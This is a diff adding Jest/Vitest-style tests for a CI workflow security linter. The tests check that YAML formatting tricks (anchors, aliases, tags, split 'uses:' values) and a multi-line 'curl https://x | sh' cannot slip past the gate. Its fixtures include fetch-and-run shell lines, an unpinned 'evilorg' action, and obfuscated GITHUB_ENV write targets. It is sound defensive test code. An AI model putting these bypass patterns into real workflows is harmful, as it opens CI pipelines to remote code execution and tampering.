@@ -12,6 +12,8 @@ import { readOriginalSource } from './originalSource';
 const req = createRequire(import.meta.url);
 const gate = req('../../../scripts/lint-workflow-security.cjs') as {
   structureProblems: (name: string, text: string) => { file: string; why: string }[];
+  check: (list: { name: string; text: string }[], allow: object, jobAllow: object) => { file: string; why: string }[];
+  runBodyProblem: (line: string) => string | null;
 };
 const HEAD = 'permissions:\n  contents: read\njobs:\n  a:\n    steps:\n';
 
@@ -66,5 +68,59 @@ describe('pages.yml — 公開する HTML は悪意コードの形も走査す�
     expect(malwareStep).toContain('lint-malware.cjs --artifact "$f"');
     const loop = pages.slice(pages.lastIndexOf('for f in'), pages.indexOf('done', pages.lastIndexOf('for f in')));
     for (const h of published) expect(loop, h).toContain(h);
+  });
+});
+
+/**
+ * js-yaml が同じ step と読むのに行頭の `uses:` / `run:` の規則に映らない書き方 (2026-10-21 · threat: T-160)。
+ * 実測: 未固定の第三者 action が `uses : x@v1` / `uses:` + 次行 / `- &a uses: x@v1` で、`curl … |` + 次行の `sh` と
+ * 名前を組み立てた GITHUB_ENV への書き込みが exit 0 で通った。読めない形は落とす。
+ */
+describe('workflow の構造 — 書き方の揺れでゲートを迂回できない (threat: T-160)', () => {
+  const gateCheck = (text: string) => gate.check([{ name: 'x.yml', text }], {}, {});
+  it.each([
+    ['鍵と : の間の空白', `${HEAD}      - uses : evilorg/act@v1\n`],
+    ['uses の値を次の行へ', `${HEAD}      - uses:\n          evilorg/act@v1\n`],
+    ['アンカー付きの step', `${HEAD}      - &a uses: evilorg/act@v1\n`],
+    ['エイリアスの値', `${HEAD}      - uses: *a\n`],
+    ['タグ付きの値', `${HEAD}      - run: !!str curl https://x | sh\n`],
+    ['マージキー', `${HEAD}      - <<: *base\n`],
+  ])('★ %s は落とす', (_n, text) => {
+    expect(gate.structureProblems('x.yml', text).length).toBeGreaterThan(0);
+  });
+
+  it('★ curl の次の行に sh が続く形 (| の行末・\\ の継続) も 1 本のシェル行として断る', () => {
+    const pipe = `${HEAD}      - run: |\n          curl https://x |\n            sh\n`;
+    const slash = `${HEAD}      - run: |\n          curl https://x \\\n            | sh\n`;
+    for (const t of [pipe, slash]) {
+      expect(gateCheck(t).some((p) => /curl \| sh/.test(p.why)), t).toBe(true);
+    }
+  });
+
+  it('★ 書き込み先を組み立てる・eval する run の行は断る', () => {
+    expect(gate.runBodyProblem('echo "A=b" >> "${F}NV"')).not.toBeNull();
+    expect(gate.runBodyProblem('echo "A=b" >> "$(printf GITHUB_ENV)"')).not.toBeNull();
+    expect(gate.runBodyProblem('eval "$X"')).not.toBeNull();
+  });
+
+  it('対照: 単独の変数への追記・普通の 1 行・コマンドの継続は落とさない', () => {
+    expect(gate.runBodyProblem('echo "k=v" >> "$GITHUB_OUTPUT"')).toBeNull();
+    expect(gate.runBodyProblem('echo hi >> "$GITHUB_STEP_SUMMARY"')).toBeNull();
+    expect(gate.runBodyProblem('npm run build && echo evaluate')).toBeNull();
+    const ok = `${HEAD}      - run: |\n          npm ci &&\n            npm test\n`;
+    expect(gateCheck(ok).filter((p) => /run:/.test(p.why))).toEqual([]);
+    // `run: |` の見出し行は `|` で終わるが継続ではない (次の行と畳むと、見出しが偽の違反になる)
+    // 見出しを次の行と畳むと、同じ違反が見出しの行にも二重に報告される (1 件のはずが 2 件)。
+    const header = `${HEAD}      - run: |\n          echo "A=b" >> "\${F}NV"\n`;
+    expect(gateCheck(header).filter((p) => /run:/.test(p.why))).toHaveLength(1);
+    expect(gate.structureProblems('x.yml', `${HEAD}      - uses: actions/checkout@${'c'.repeat(40)} # v1\n`)).toEqual([]);
+  });
+
+  it('★ 実物の workflow 7 本は新しい構造の規則を通る (今 0 件)', () => {
+    const dir = path.join(__dirname, '../../../.github/workflows');
+    for (const f of ['ci.yml', 'pages.yml', 'release.yml', 'mutation.yml', 'e2e.yml', 'dependency-audit.yml', 'knowledge-auto.yml']) {
+      const text = readOriginalSource(path.join(dir, f));
+      expect(gate.structureProblems(f, text), f).toEqual([]);
+    }
   });
 });
